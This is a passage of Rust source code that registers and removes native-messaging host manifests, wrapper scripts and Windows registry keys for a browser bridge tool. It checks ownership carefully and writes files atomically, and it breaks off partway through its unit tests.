//! Native-messaging registration: the write/repair/remove engine behind
//! `doctor --fix` and `uninstall`, and the API the app's self-registration
//! uses. Browser locations come from the shared resolver in
//! [`crate::browsers`], the same one `doctor` diagnoses with.
//!
//! A registration points at THIS binary (its resolved `current_exe`); nothing
//! here builds, downloads, or copies anything, and the browser itself is
//! never touched. Repairing is idempotent re-registration, so on a fresh
//! machine `doctor --fix` IS the install.
//!
//! Fail-closed rules:
//! - `uninstall` removes only files this project verifiably wrote. A manifest
//!   that carries our filename but not our content is reported and left in
//!   place, never deleted; so is one that cannot be read and verified.
//! - `--fix` refuses to overwrite a manifest it cannot verify as ours.
//! - Same-user attacker note: these files live in the user's own config dirs,
//!   so a hostile same-user process could always write them directly; the
//!   checks here exist to keep OUR tooling from ever destroying someone
//!   else's registration or executing a swap we did not intend, not to stop
//!   an attacker who already has the user's filesystem rights (that boundary
//!   is enforced at the IPC layer, not here).
//!
//! Chrome's manifest has no `args` field, so on macOS/Linux each browser gets
//! a tiny wrapper script baking in `--native-host --label <browser>`; the
//! label rides the bridge handshake so one MCP server can address several
//! browsers. On Windows, Chrome appends the extension origin to the command
//! line (which selects native-host mode), so the manifest points straight at
//! the binary and registration is an HKCU registry key. The Windows path
//! compiles and mirrors what the retired `install.ps1` did, but still needs verification on a real
//! Windows machine (see docs/cli.md).

use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};

use crate::browsers::{
    self, BaseDirs, Browser, BrowserEntry, Os, Registration, HOST_ID, PINNED_EXTENSION_ID,
};
use crate::cli::{DoctorArgs, UninstallArgs};

/// The `description` the legacy `install.sh` / `install.ps1` wrote, verbatim.
const MANIFEST_DESCRIPTION_LEGACY: &str = "Chromium Bridge native messaging host";

/// The `description` this engine writes: the ownership marker. Writer-neutral
/// (`doctor --fix` and the app's self-registration write the same bytes).
const MANIFEST_DESCRIPTION: &str =
    "Chromium Bridge native messaging host (managed by chromium-bridge)";

/// First line of every wrapper this project writes.
const WRAPPER_SHEBANG: &str = "#!/usr/bin/env bash";

/// Everything the engine needs to lay a registration down. Paths are injected
/// so tests drive it against temp trees, never real browser dirs, and so the
/// app can point it at the same places the CLI does.
pub struct Registrar {
    /// The host binary every registration points at (resolved `current_exe`
    /// in the CLI; an explicit path in tests).
    pub host_exe: PathBuf,
    /// Where wrapper scripts live (Unix). Same directory the shell installer
    /// used, so re-registering over a legacy `install.sh` install converges.
    pub install_dir: PathBuf,
    /// The extension ID trusted in `allowed_origins`.
    pub extension_id: String,
}

/// One registration to write or remove: a known browser (labeled) or an
/// explicit `--manifest-dir` (unlabeled).
pub struct Target {
    /// The browser whose key is baked into the wrapper as `--label`; `None`
    /// for explicit dirs, whose browser we cannot name.
    pub browser: Option<Browser>,
    pub registration: Registration,
}

impl Target {
    pub fn for_browser(entry: &BrowserEntry) -> Target {
        Target {
            browser: Some(entry.browser),
            registration: entry.registration.clone(),
        }
    }

    pub fn for_explicit_dir(dir: &Path) -> Target {
        Target {
            browser: None,
            registration: browsers::explicit_dir_registration(dir),
        }
    }

    fn label(&self) -> Option<&'static str> {
        self.browser.map(Browser::key)
    }

    fn describe(&self) -> String {
        match self.browser {
            Some(b) => b.key().to_string(),
            None => self.registration.location(),
        }
    }
}

/// Verdict on an existing manifest file's contents: ours or not.
#[derive(Debug, PartialEq, Eq)]
pub enum Ownership {
    Ours,
    Foreign(String),
}

/// The diagnosed state of one registration, as reported by `doctor` and
/// repaired by `--fix`.
#[derive(Debug, PartialEq, Eq)]
pub enum RegState {
    /// No manifest file (and no registry key on Windows).
    Missing,
    /// Ours and its launch path exists.
    Ok,
    /// Ours, but broken: the reason says what (dangling launch path, or a
    /// Windows manifest file without its registry key).
    Stale(String),
    /// Present but not written by this project.
    Foreign(String),
    /// Could not be read/verified (permissions, not a file, ...).
    Unreadable(String),
}

impl RegState {
    /// Short human word(s) for reports.
    pub fn describe(&self) -> String {
        match self {
            RegState::Missing => "missing".into(),
            RegState::Ok => "ok".into(),
            RegState::Stale(why) => format!("stale ({why})"),
            RegState::Foreign(why) => format!("NOT OURS ({why})"),
            RegState::Unreadable(why) => format!("unreadable ({why})"),
        }
    }
}

/// Decide whether manifest `contents` were written by this project. Ours
/// means: valid JSON whose `name` is our host id and whose `description` is
/// EXACTLY one of the two strings this project has ever written (the legacy
/// shell installers' and this engine's). Anything else -- unparsable, another
/// host id, another description -- is foreign and must never be deleted.
pub fn manifest_ownership(contents: &str) -> Ownership {
    let parsed: serde_json::Value = match serde_json::from_str(contents) {
        Ok(v) => v,
        Err(e) => return Ownership::Foreign(format!("not a JSON manifest ({e})")),
    };
    match parsed.get("name").and_then(|v| v.as_str()) {
        Some(name) if name == HOST_ID => {}
        other => {
            return Ownership::Foreign(format!("manifest name is {other:?}, expected {HOST_ID:?}"))
        }
    }
    match parsed.get("description").and_then(|v| v.as_str()) {
        Some(MANIFEST_DESCRIPTION_LEGACY) | Some(MANIFEST_DESCRIPTION) => Ownership::Ours,
        _ => Ownership::Foreign(
            "manifest description does not match any Chromium Bridge marker".into(),
        ),
    }
}

/// Diagnose one registration (read-only). This is what `doctor` prints per
/// browser and what decides whether `--fix` has anything to repair.
pub fn assess(reg: &Registration) -> RegState {
    let manifest_path = reg.manifest_path();

    // On Windows the key is half the registration; a surviving key must be
    // reported even when the manifest file is gone, and a re-pointed or
    // unreadable key must never be summarized as merely "missing".
    let key_state = match reg {
        Registration::ManifestDir(_) => None,
        Registration::Registry { key, .. } => match registry_key_state(key, &manifest_path) {
            RegistryKeyState::PointsElsewhere(v) => {
                return RegState::Foreign(format!(
                    "registry key HKCU\\{key} points at {v:?}, not our manifest"
                ));
            }
            RegistryKeyState::Error(e) => {
                return RegState::Unreadable(format!("registry key HKCU\\{key}: {e}"));
            }
            other => Some((key, matches!(other, RegistryKeyState::PointsAtManifest))),
        },
    };

    let contents = match fs::read_to_string(&manifest_path) {
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
            return match key_state {
                // Key still installed but its manifest file is gone.
                Some((key, true)) => RegState::Stale(format!(
                    "manifest file missing but registry key HKCU\\{key} present"
                )),
                _ => RegState::Missing,
            };
        }
        Err(e) => return RegState::Unreadable(e.to_string()),
        Ok(c) => c,
    };
    match manifest_ownership(&contents) {
        Ownership::Foreign(why) => return RegState::Foreign(why),
        Ownership::Ours => {}
    }
    // Ours: the registration is healthy only if what it launches exists.
    let launch = serde_json::from_str::<serde_json::Value>(&contents)
        .ok()
        .and_then(|v| v.get("path").and_then(|p| p.as_str()).map(PathBuf::from));
    match launch {
        Some(p) if p.is_file() => {}
        Some(p) => return RegState::Stale(format!("launch path missing: {}", p.display())),
        None => return RegState::Stale("manifest has no launch path".into()),
    }
    if let Some((key, false)) = key_state {
        return RegState::Stale(format!("registry key HKCU\\{key} missing"));
    }
    RegState::Ok
}

impl Registrar {
    /// The JSON manifest for `launch_path` (the wrapper on Unix, the binary
    /// itself on Windows).
    fn manifest_json(&self, launch_path: &Path) -> Result<String, String> {
        let manifest = serde_json::json!({
            "name": HOST_ID,
            "description": MANIFEST_DESCRIPTION,
            "path": launch_path,
            "type": "stdio",
            "allowed_origins": [format!("chrome-extension://{}/", self.extension_id)],
        });
        // to_string_pretty on a json! literal cannot fail; propagate rather
        // than panic if serde_json ever finds a way.
        let mut text = serde_json::to_string_pretty(&manifest)
            .map_err(|e| format!("could not serialize the host manifest: {e}"))?;
        text.push('\n');
        Ok(text)
    }

    /// Wrapper script content: exec the host in native-host mode, optionally
    /// with the browser label.
    fn wrapper_script(&self, label: Option<&str>) -> String {
        let mut exec_line = format!(
            "exec {} --native-host",
            shell_quote(&self.host_exe.to_string_lossy())
        );
        if let Some(key) = label {
            exec_line.push_str(&format!(" --label {}", shell_quote(key)));
        }
        format!("{WRAPPER_SHEBANG}\n# managed by chromium-bridge; safe to delete\n{exec_line}\n")
    }

    fn wrapper_path(&self, label: Option<&str>) -> PathBuf {
        match label {
            Some(key) => self.install_dir.join(format!("run-host-{key}.sh")),
            None => self.install_dir.join("run-host.sh"),
        }
    }

    /// Write one registration. Returns the human report lines for stdout.
    /// Idempotent: re-running overwrites our own artifacts in place. An
    /// existing manifest that is not verifiably ours fails this target (fail
    /// closed), and so does one that cannot be read.
    pub fn register(&self, target: &Target) -> Result<Vec<String>, String> {
        // A registry registration is impossible from a non-Windows build;
        // refuse before writing anything at all.
        if let Registration::Registry { key, .. } = &target.registration {
            registry_supported(key)?;
        }
        let manifest_path = target.registration.manifest_path();
        match fs::read_to_string(&manifest_path) {
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => {
                // Unreadable is NOT absent: a permission error or a directory
                // at this path must never be silently replaced.
                return Err(format!(
                    "cannot verify the existing {}: {e} (left untouched)",
                    manifest_path.display()
                ));
            }
            Ok(existing) => {
                if let Ownership::Foreign(why) = manifest_ownership(&existing) {
                    return Err(format!(
                        "refusing to overwrite {}: {why}. Inspect and remove it yourself if it is stale.",
                        manifest_path.display()
                    ));
                }
            }
        }

        let mut lines = Vec::new();
        let launch_path = match &target.registration {
            Registration::ManifestDir(dir) => {
                // Unix: wrapper first, then the manifest that points at it.
                ensure_private_dir(&self.install_dir)
                    .map_err(|e| format!("could not create {}: {e}", self.install_dir.display()))?;
                let label = target.label();
                let wrapper = self.wrapper_path(label);
                write_atomic(&wrapper, self.wrapper_script(label).as_bytes(), true)
                    .map_err(|e| format!("could not write {}: {e}", wrapper.display()))?;
                fs::create_dir_all(dir)
                    .map_err(|e| format!("could not create {}: {e}", dir.display()))?;
                lines.push(format!(
                    "  launches {}{}",
                    wrapper.display(),
                    label.map(|k| format!(" (label: {k})")).unwrap_or_default()
                ));
                wrapper
            }
            Registration::Registry { key, .. } => {
                // Windows: manifest in our own store dir, registry key points
                // at it, binary launched directly (origin argv selects mode).
                ensure_private_dir(&self.install_dir)
                    .map_err(|e| format!("could not create {}: {e}", self.install_dir.display()))?;
                lines.push(format!("  registry key HKCU\\{key}"));
                self.host_exe.clone()
            }
        };

        write_atomic(
            &manifest_path,
            self.manifest_json(&launch_path)?.as_bytes(),
            false,
        )
        .map_err(|e| format!("could not write {}: {e}", manifest_path.display()))?;
        lines.insert(
            0,
            format!(
                "{}: manifest written to {}",
                target.describe(),
                manifest_path.display()
            ),
        );

        if let Registration::Registry { key, .. } = &target.registration {
            set_registry_key(key, &manifest_path)?;
        }
        Ok(lines)
    }

    /// Reverse one registration. Returns a report line; `Ok` covers both
    /// "removed" and "was not present". Ownership is verified BEFORE anything
    /// is deleted (manifest file and, on Windows, the registry key): a
    /// foreign or unverifiable manifest leaves everything in place.
    pub fn uninstall(target: &Target) -> Result<String, String> {
        let manifest_path = target.registration.manifest_path();

        let file_present = match fs::read_to_string(&manifest_path) {
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => false,
            Err(e) => {
                return Err(format!(
                    "could not read {} to verify it is ours: {e} (left in place)",
                    manifest_path.display()
                ));
            }
            Ok(contents) => match manifest_ownership(&contents) {
                Ownership::Ours => true,
                Ownership::Foreign(why) => {
                    return Err(format!(
                        "refusing to remove {}: {why}. Not written by chromium-bridge; remove it yourself if you are sure.",
                        manifest_path.display()
                    ));
                }
            },
        };

        // Only after the content check: drop the registry key and then the
        // verified file. The key's final segment is our host id, but its
        // value must also point at OUR manifest store path -- a key someone
        // re-pointed at their own manifest is refused, not deleted.
        if let Registration::Registry { key, .. } = &target.registration {
            remove_registry_key(key, &manifest_path)?;
        }
        if !file_present {
            return Ok(format!("{}: not registered", target.describe()));
        }
        fs::remove_file(&manifest_path)
            .map_err(|e| format!("could not remove {}: {e}", manifest_path.display()))?;
        Ok(format!(
            "{}: removed manifest {}",
            target.describe(),
            manifest_path.display()
        ))
    }
}

/// Split one line of wrapper shell into its literal tokens. Understands only
/// what our generators ever emit: bare words, backslash escapes, and
/// single-quoted segments. Any construct with evaluation semantics in an
/// unquoted context (`$`, backticks, `;`, `&`, `|`, parens, redirection,
/// double quotes) returns `None`: the line is not shell-literal, so it cannot
/// be one of ours.
fn split_shell_literal(line: &str) -> Option<Vec<String>> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut in_token = false;
    let mut chars = line.chars();
    while let Some(c) = chars.next() {
        match c {
            '\'' => {
                in_token = true;
                loop {
                    match chars.next() {
                        Some('\'') => break,
                        Some(ch) => current.push(ch),
                        None => return None, // unterminated quote
                    }
                }
            }
            '\\' => {
                in_token = true;
                current.push(chars.next()?);
            }
            // Evaluation semantics (substitution, control operators,
            // redirection) and word expansion (glob, brace, tilde, history):
            // any of these unquoted means the line is not shell-literal.
            '$' | '`' | ';' | '&' | '|' | '(' | ')' | '<' | '>' | '"' | '*' | '?' | '[' | ']'
            | '{' | '}' | '~' | '!' => return None,
            c if c.is_whitespace() => {
                if in_token {
                    tokens.push(std::mem::take(&mut current));
                    in_token = false;
                }
            }
            c => {
                in_token = true;
                current.push(c);
            }
        }
    }
    if in_token {
        tokens.push(current);
    }
    Some(tokens)
}

/// Whether wrapper-script `contents` are something this project wrote: the
/// bash shebang, optionally comment/blank lines, and exactly ONE payload
/// line whose literal tokens are exactly
/// `exec <path> --native-host [--label <valid-label>]` -- the trampoline
/// shape this engine (and the retired `install.sh`) generates, and nothing that does
/// more than launch the host.
fn wrapper_is_ours(contents: &str) -> bool {
    let mut lines = contents.lines();
    if lines.next() != Some(WRAPPER_SHEBANG) {
        return false;
    }
    let mut exec_lines = 0usize;
    for line in lines {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        let Some(tokens) = split_shell_literal(trimmed) else {
            return false;
        };
        let is_trampoline = match tokens.as_slice() {
            [exec, _path, flag] => exec == "exec" && flag == "--native-host",
            [exec, _path, flag, label_flag, label] => {
                exec == "exec"
                    && flag == "--native-host"
                    && label_flag == "--label"
                    && crate::ipc::validate_label(label)
            }
            _ => false,
        };
        if is_trampoline {
            exec_lines += 1;
        } else {
            return false;
        }
    }
    exec_lines == 1
}

/// Remove the wrapper scripts this engine writes (exact, project-unique names
/// only), each verified by [`wrapper_is_ours`] before deletion. Returns
/// (report lines, errors).
pub fn remove_wrappers(install_dir: &Path) -> (Vec<String>, Vec<String>) {
    let mut removed = Vec::new();
    let mut errors = Vec::new();
    let mut names = vec!["run-host.sh".to_string()];
    names.extend(
        Browser::ALL
            .iter()
            .map(|b| format!("run-host-{}.sh", b.key())),
    );
    for name in names {
        let path = install_dir.join(name);
        let contents = match fs::read_to_string(&path) {
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Err(e) => {
                errors.push(format!(
                    "could not read {}: {e} (left in place)",
                    path.display()
                ));
                continue;
            }
            Ok(c) => c,
        };
        if wrapper_is_ours(&contents) {
            match fs::remove_file(&path) {
                Ok(()) => removed.push(format!("removed wrapper {}", path.display())),
                Err(e) => errors.push(format!("could not remove {}: {e}", path.display())),
            }
        } else {
            errors.push(format!(
                "refusing to remove {}: not a chromium-bridge wrapper (left in place)",
                path.display()
            ));
        }
    }
    // Drop the dir only when now empty; remove_dir never deletes contents.
    let _ = fs::remove_dir(install_dir);
    (removed, errors)
}

/// `chromium-bridge uninstall`: parse argv and run. Returns the exit code.
pub fn run_uninstall_cli(argv: &[String]) -> i32 {
    match crate::cli::uninstall_args(argv) {
        Ok(args) => run_uninstall(&args),
        Err(e) => {
            eprintln!("uninstall: {e}");
            2
        }
    }
}

/// `doctor --fix`: (re-)register the selected targets. Idempotent, so a
/// fresh machine gets its first registration and a broken one gets repaired
/// by the same code path. Returns the process exit code.
pub fn run_fix(args: &DoctorArgs) -> i32 {
    let (os, dirs) = match resolve_env() {
        Ok(v) => v,
        Err(code) => return code,
    };
    let entries = browsers::resolve(os, &dirs);
    let targets = match select_targets(args, &entries) {
        Ok(t) => t,
        Err(code) => return code,
    };

    let host_exe = match resolve_host_exe() {
        Ok(p) => p,
        Err(e) => {
            log_error!("doctor", "cannot resolve this binary's path: {e}");
            return 1;
        }
    };
    let registrar = Registrar {
        host_exe: host_exe.clone(),
        install_dir: browsers::install_dir(os, &dirs),
        extension_id: PINNED_EXTENSION_ID.to_string(),
    };

    println!("chromium-bridge doctor --fix (host id {HOST_ID})");
    println!("host binary: {}", host_exe.display());
    let mut failures = 0;
    for target in &targets {
        match registrar.register(target) {
            Ok(lines) => {
                for line in lines {
                    println!("{line}");
                }
            }
            Err(e) => {
                log_error!("doctor", "{}: {e}", target.describe());
                failures += 1;
            }
        }
    }
    println!("allowed origin: chrome-extension://{PINNED_EXTENSION_ID}/");
    println!(
        "next: load the extension (chrome://extensions -> Load unpacked), then restart the\n\
         browser so it re-reads its NativeMessagingHosts registrations. Re-check with\n\
         `chromium-bridge doctor`."
    );
    if failures > 0 {
        log_error!("doctor", "{failures} target(s) failed; see above");
        1
    } else {
        0
    }
}

/// `chromium-bridge uninstall`: entry point. Removes the registrations for
/// every known browser plus any re-passed `--manifest-dir`, and the wrapper
/// scripts -- exactly what this project writes, nothing else. The binary, the
/// browser, and the loaded extension are never touched.
pub fn run_uninstall(args: &UninstallArgs) -> i32 {
    let (os, dirs) = match resolve_env() {
        Ok(v) => v,
        Err(code) => return code,
    };
    let entries = browsers::resolve(os, &dirs);

    let mut targets: Vec<Target> = entries.iter().map(Target::for_browser).collect();
    for dir in &args.manifest_dirs {
        targets.push(Target::for_explicit_dir(Path::new(dir)));
    }

    println!("chromium-bridge uninstall (host id {HOST_ID})");
    let mut failures = 0;
    for target in &targets {
        match Registrar::uninstall(target) {
            Ok(line) => println!("{line}"),
            Err(e) => {
                log_error!("uninstall", "{}: {e}", target.describe());
                failures += 1;
            }
        }
    }
    let (removed, errors) = remove_wrappers(&browsers::install_dir(os, &dirs));
    for line in removed {
        println!("{line}");
    }
    for e in errors {
        log_error!("uninstall", "{e}");
        failures += 1;
    }
    println!(
        "left untouched: this binary, your browsers, and the loaded extension\n\
         (remove the unpacked extension yourself via chrome://extensions)."
    );
    if failures > 0 {
        1
    } else {
        0
    }
}

/// Shared CLI preamble: pick the OS layout and read the base dirs, failing
/// closed (exit 1) when the environment cannot name a home directory.
pub(crate) fn resolve_env() -> Result<(Os, BaseDirs), i32> {
    match BaseDirs::from_env() {
        Ok(dirs) => Ok((Os::current(), dirs)),
        Err(e) => {
            log_error!("doctor", "{e}");
            Err(1)
        }
    }
}

/// Resolve and sanity-check the path registrations will launch. An ephemeral
/// path (AppImage FUSE mount, temp dir) gets a loud warning: the manifest
/// would dangle after exit, so the binary should be copied somewhere stable
/// first (docs/cli.md shows the Linux AppImage recipe).
fn resolve_host_exe() -> std::io::Result<PathBuf> {
    let exe = std::env::current_exe()?.canonicalize()?;
    let looks_ephemeral = exe.starts_with(std::env::temp_dir())
        || exe
            .components()
            .any(|c| c.as_os_str().to_string_lossy().starts_with(".mount_"));
    if looks_ephemeral {
        log_warn!(
            "doctor",
            "this binary runs from an ephemeral path ({}); the registration will break \
             when it disappears. Copy the binary to a stable location (e.g. \
             ~/.local/lib/chromium-bridge/) and run `doctor --fix` from there.",
            exe.display()
        );
    }
    Ok(exe)
}

/// Turn the parsed `--fix` targeting flags into concrete targets.
/// Auto-detection finding no browser is an error with guidance, not a silent
/// default.
fn select_targets(args: &DoctorArgs, entries: &[BrowserEntry]) -> Result<Vec<Target>, i32> {
    if !args.manifest_dirs.is_empty() {
        return Ok(args
            .manifest_dirs
            .iter()
            .map(|d| Target::for_explicit_dir(Path::new(d)))
            .collect());
    }
    if args.all {
        return Ok(entries.iter().map(Target::for_browser).collect());
    }
    if let Some(keys) = &args.browsers {
        let mut targets = Vec::new();
        for key in keys {
            let Some(browser) = Browser::from_key(key) else {
                log_error!(
                    "doctor",
                    "unknown --browser key {key:?}; known: {}",
                    known_keys()
                );
                return Err(2);
            };
            let Some(entry) = entries.iter().find(|e| e.browser == browser) else {
                // resolve() enumerates every Browser variant, so this cannot
                // be reached; refuse with the same typed exit as a bad key
                // rather than panic if that invariant is ever broken.
                log_error!("doctor", "browser {key:?} missing from the resolved set");
                return Err(2);
            };
            targets.push(Target::for_browser(entry));
        }
        return Ok(targets);
    }
    // Default: every browser detected on this machine.
    let detected: Vec<Target> = entries
        .iter()
        .filter(|e| e.detected())
        .map(Target::for_browser)
        .collect();
    if detected.is_empty() {
        log_error!(
            "doctor",
            "no Chromium-family browser detected for this user; pass --browser <keys> \
             (known: {}), --all, or --manifest-dir <dir>",
            known_keys()
        );
        return Err(1);
    }
    Ok(detected)
}

pub(crate) fn known_keys() -> String {
    Browser::ALL
        .iter()
        .map(|b| b.key())
        .collect::<Vec<_>>()
        .join(",")
}

/// Quote `s` for safe inclusion in the wrapper's bash `exec` line: wrapped in
/// single quotes, embedded single quotes escaped as `'\''`.
fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', r"'\''"))
}

/// Create `dir` (and parents) and force owner-only permissions on it: it
/// holds executable wrapper content the browser launches, so group/world
/// write would let another account swap them. Refuses a symlink at the leaf
/// (our namespace must not be redirected elsewhere). Mirrors
/// `ensure_private_dir` in the IPC layer and the 0700 the shell installer
/// enforced.
fn ensure_private_dir(dir: &Path) -> std::io::Result<()> {
    fs::create_dir_all(dir)?;
    if fs::symlink_metadata(dir)?.file_type().is_symlink() {
        return Err(std::io::Error::other(
            "is a symlink; refusing to use it as the wrapper directory",
        ));
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(dir, fs::Permissions::from_mode(0o700))?;
    }
    Ok(())
}

/// Write `bytes` to `path` atomically: exclusive-create a temp file beside it
/// (never following a planted symlink; a colliding name is retried, never
/// deleted), set permissions, fsync, rename over the destination, then fsync
/// the directory so the entry survives a crash. The final path is replaced,
/// never written through (rename replaces even a symlink at the final
/// component without following it).
fn write_atomic(path: &Path, bytes: &[u8], executable: bool) -> std::io::Result<()> {
    let file_name = path
        .file_name()
        .ok_or_else(|| std::io::Error::other("target path has no file name"))?
        .to_string_lossy()
        .into_owned();

    let mut tmp = None;
    let mut file = None;
    for attempt in 0..3u32 {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.subsec_nanos())
            .unwrap_or(0);
        let candidate = path.with_file_name(format!(
            "{file_name}.tmp.{}.{nanos}.{attempt}",
            std::process::id()
        ));
        match fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(&candidate)
        {
            Ok(f) => {
                tmp = Some(candidate);
                file = Some(f);
                break;
            }
            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => continue,
            Err(e) => return Err(e),
        }
    }
    let (tmp, mut f) = match (tmp, file) {
        (Some(t), Some(f)) => (t, f),
        _ => {
            return Err(std::io::Error::other(
                "could not create a unique temp file next to the target",
            ))
        }
    };

    let result = (|| {
        f.write_all(bytes)?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = if executable { 0o755 } else { 0o644 };
            f.set_permissions(fs::Permissions::from_mode(mode))?;
        }
        #[cfg(not(unix))]
        let _ = executable;
        f.sync_all()?;
        drop(f);
        fs::rename(&tmp, path)?;
        // Sync the directory entry too, so a crash right after rename cannot
        // lose the file. Directories cannot be fsynced on Windows.
        #[cfg(unix)]
        if let Some(parent) = path.parent() {
            fs::File::open(parent)?.sync_all()?;
        }
        Ok(())
    })();
    if result.is_err() {
        let _ = fs::remove_file(&tmp);
    }
    result
}

// ---- Windows registry (compiles cross-OS; the real writes are cfg(windows)).
// The non-Windows stubs fail closed: a Registry registration cannot be
// performed or observed from a Unix build.

#[cfg(windows)]
fn registry_supported(_key: &str) -> Result<(), String> {
    Ok(())
}

#[cfg(not(windows))]
fn registry_supported(key: &str) -> Result<(), String> {
    Err(format!(
        "registry registration (HKCU\\{key}) requires a Windows build of chromium-bridge"
    ))
}

#[cfg(windows)]
fn set_registry_key(key: &str, manifest_path: &Path) -> Result<(), String> {
    let hkcu = winreg::RegKey::predef(winreg::enums::HKEY_CURRENT_USER);
    let (subkey, _) = hkcu
        .create_subkey(key)
        .map_err(|e| format!("could not create HKCU\\{key}: {e}"))?;
    subkey
        .set_value("", &manifest_path.as_os_str())
        .map_err(|e| format!("could not set HKCU\\{key}: {e}"))
}

#[cfg(not(windows))]
fn set_registry_key(key: &str, _manifest_path: &Path) -> Result<(), String> {
    Err(format!(
        "registry registration (HKCU\\{key}) requires a Windows build of chromium-bridge"
    ))
}

/// What a registration's HKCU key says, checked against the manifest path we
/// manage. Anything but `PointsAtManifest` blocks deletion. Off Windows only
/// the `Error` stub is ever built, so the other variants are cfg-dead there.
#[cfg_attr(not(windows), allow(dead_code))]
enum RegistryKeyState {
    Missing,
    PointsAtManifest,
    PointsElsewhere(String),
    Error(String),
}

#[cfg(windows)]
fn registry_key_state(key: &str, manifest_path: &Path) -> RegistryKeyState {
    let hkcu = winreg::RegKey::predef(winreg::enums::HKEY_CURRENT_USER);
    let subkey = match hkcu.open_subkey(key) {
        Ok(k) => k,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return RegistryKeyState::Missing,
        Err(e) => return RegistryKeyState::Error(e.to_string()),
    };
    // Windows paths are case-insensitive and accept either separator; we
    // wrote the value ourselves, but normalize before comparing so a
    // round-tripped registration is never misreported as re-pointed.
    let normalize = |p: &str| p.replace('/', "\\").to_ascii_lowercase();
    match subkey.get_value::<String, _>("") {
        Ok(v) if normalize(&v) == normalize(&manifest_path.to_string_lossy()) => {
            RegistryKeyState::PointsAtManifest
        }
        Ok(v) => RegistryKeyState::PointsElsewhere(v),
        Err(e) => RegistryKeyState::Error(format!("no readable default value: {e}")),
    }
}

#[cfg(not(windows))]
fn registry_key_state(_key: &str, _manifest_path: &Path) -> RegistryKeyState {
    RegistryKeyState::Error("registry access requires a Windows build of chromium-bridge".into())
}

/// Delete a registration key, but only when it is verifiably ours: missing is
/// fine (idempotent), pointing at our manifest is deleted, anything else --
/// re-pointed at another manifest, or unreadable -- is refused (fail closed).
#[cfg(windows)]
fn remove_registry_key(key: &str, manifest_path: &Path) -> Result<(), String> {
    match registry_key_state(key, manifest_path) {
        RegistryKeyState::Missing => return Ok(()),
        RegistryKeyState::PointsAtManifest => {}
        RegistryKeyState::PointsElsewhere(v) => {
            return Err(format!(
                "refusing to delete HKCU\\{key}: it points at {v:?}, not our manifest (left in place)"
            ));
        }
        RegistryKeyState::Error(e) => {
            return Err(format!(
                "could not verify HKCU\\{key} before deleting it: {e} (left in place)"
            ));
        }
    }
    let hkcu = winreg::RegKey::predef(winreg::enums::HKEY_CURRENT_USER);
    // delete_subkey (not _all): our key has no children, and failing on an
    // unexpected child is the fail-closed behavior we want.
    match hkcu.delete_subkey(key) {
        Ok(()) => Ok(()),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(()),
        Err(e) => Err(format!("could not delete HKCU\\{key}: {e}")),
    }
}

#[cfg(not(windows))]
fn remove_registry_key(key: &str, _manifest_path: &Path) -> Result<(), String> {
    Err(format!(
        "registry removal (HKCU\\{key}) requires a Windows build of chromium-bridge"
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Unique temp tree per test; removed on drop. Tests only ever touch
    /// paths under this root -- never a real browser or user directory.
    struct TempTree(PathBuf);

    impl TempTree {
        fn new(tag: &str) -> TempTree {
            let root =
                std::env::temp_dir().join(format!("bb-registration-{tag}-{}", std::process::id()));
            let _ = fs::remove_dir_all(&root);
            fs::create_dir_all(&root).unwrap();
            TempTree(root)
        }

        fn path(&self, rel: &str) -> PathBuf {
            self.0.join(rel)
        }
    }

    impl Drop for TempTree {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.0);
        }
    }

    fn registrar(tree: &TempTree) -> Registrar {
        // A real file at the host_exe path, so an assess() of what we wrote
        // reports Ok rather than a dangling launch path.
        let exe = tree.path("bin/chromium-bridge");
        fs::create_dir_all(exe.parent().unwrap()).unwrap();
        fs::write(&exe, "#!/bin/sh\n").unwrap();
        Registrar {
            host_exe: exe,
            install_dir: tree.path("install"),
            extension_id: PINNED_EXTENSION_ID.to_string(),
        }
    }

    fn browser_target(tree: &TempTree) -> Target {
        Target {
            browser: Some(Browser::Chrome),
            registration: Registration::ManifestDir(tree.path("nm/chrome/NativeMessagingHosts")),
        }
    }

    #[test]
    fn register_writes_manifest_and_labeled_wrapper() {
        let tree = TempTree::new("register");
        let reg = registrar(&tree);
        let target = browser_target(&tree);
        reg.register(&target).unwrap();

        let manifest_path = target.registration.manifest_path();
        let manifest: serde_json::Value =
            serde_json::from_str(&fs::read_to_string(&manifest_path).unwrap()).unwrap();
        assert_eq!(manifest["name"], HOST_ID);
        assert_eq!(manifest["type"], "stdio");
        assert_eq!(
            manifest["allowed_origins"][0],
            format!("chrome-extension://{PINNED_EXTENSION_ID}/")
        );
        let wrapper = PathBuf::from(manifest["path"].as_str().unwrap());
        assert_eq!(wrapper, tree.path("install/run-host-chrome.sh"));
        let script = fs::read_to_string(&wrapper).unwrap();
        assert!(wrapper_is_ours(&script), "{script}");
        assert!(script.contains("--label 'chrome'"));
        assert!(script.contains(&*tree.path("bin/chromium-bridge").to_string_lossy()));

        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = fs::metadata(&wrapper).unwrap().permissions().mode() & 0o777;
            assert_eq!(mode, 0o755);
            let dir_mode = fs::metadata(tree.path("install"))
                .unwrap()
                .permissions()
                .mode()
                & 0o777;
            assert_eq!(dir_mode, 0o700);
        }
    }

    #[test]
    fn register_is_idempotent_and_uninstall_reverses_it() {
        let tree = TempTree::new("roundtrip");
        let reg = registrar(&tree);
        let target = browser_target(&tree);
        reg.register(&target).unwrap();
        // Second run overwrites our own artifacts without complaint.
        reg.register(&target).unwrap();
        assert_eq!(assess(&target.registration), RegState::Ok);

        let line = Registrar::uninstall(&target).unwrap();
